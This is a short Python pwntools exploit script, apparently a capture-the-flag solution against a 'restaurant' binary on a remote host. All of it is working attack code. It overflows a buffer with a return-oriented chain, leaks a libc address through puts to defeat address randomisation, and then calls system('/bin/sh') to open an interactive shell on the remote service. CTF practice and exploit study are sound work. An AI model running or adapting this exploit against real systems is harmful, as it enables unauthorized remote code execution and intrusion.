from pwn import *
def gd():
    gdb.attach(p)
    pause()

#p = process("./restaurant")
p = remote('154.57.164.81', 32402)
elf = ELF("./restaurant")
libc = ELF("./libc.so.6")

ret_addr = 0x000000000040063e
pop_rdi = 0x00000000004010a3
vuln_func = 0x0000000000400E4A # fill function address

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')

# Stage 1: Leak the libc address of 'exit' to defeat ASLR
p.sendline(b'a' * 0x28 + p64(pop_rdi) + p64(elf.got['exit']) + p64(elf.plt['puts']) + p64(vuln_func))

p.recvuntil(b'a' * 0x28)
p.recv(3)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['exit']

# Calculate actual addresses of system and /bin/sh
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

print(hex(libc_base))

p.recvuntil(b'> ')
# Stage 2: Trigger system("/bin/sh")
# ret_addr is used here for stack alignment (fixing the 'MOVAPS' crash)
p.sendline(b'a' * 0x28 + p64(pop_rdi) + p64(sh_addr) + p64(ret_addr) + p64(sys_addr))

p.interactive()